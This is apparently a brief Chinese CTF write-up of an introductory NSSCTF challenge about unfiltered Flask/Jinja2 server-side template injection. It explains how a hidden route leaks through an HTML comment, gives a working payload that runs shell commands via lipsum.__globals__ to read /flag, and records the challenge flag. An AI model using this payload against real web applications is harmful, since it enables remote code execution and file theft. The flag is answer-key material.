---
type: source
created: 2026-05-11
updated: 2026-05-11
related: []
---

# 玄武杯2025 锦家有什么 (NSSCTF)

Flask Jinja2 SSTI 入门题，无任何过滤。题目名"锦家"谐音 Jinja，HTML 注释泄露隐藏路由 `/try_a_try`，`name` 参数直接渲染到模板，`lipsum.__globals__["os"].popen()` 一步 RCE。

涉及概念：[[concepts/jinja2-ssti-tag-bypass]]
涉及实体：[[entities/ctf_nssctf]]

## 挑战

Flask 应用，`/try_a_try?name=` 参数被 Jinja2 渲染。无过滤。

## 信息收集

- 题目名"锦家" = Jinja 谐音
- HTML 注释：`<!--哦原来是我忘记放进去了，那就直接给你吧 /try_a_try-->`
- 提示：flag 在 `/` 根目录

## Payload

```
{{lipsum.__globals__["os"].popen("cat /flag").read()}}
```

## Flag

```
NSSCTF{1babc336-0467-482e-856b-f43363135b2a}
```

## 踩坑

- 无。纯入门题，无过滤无 WAF。
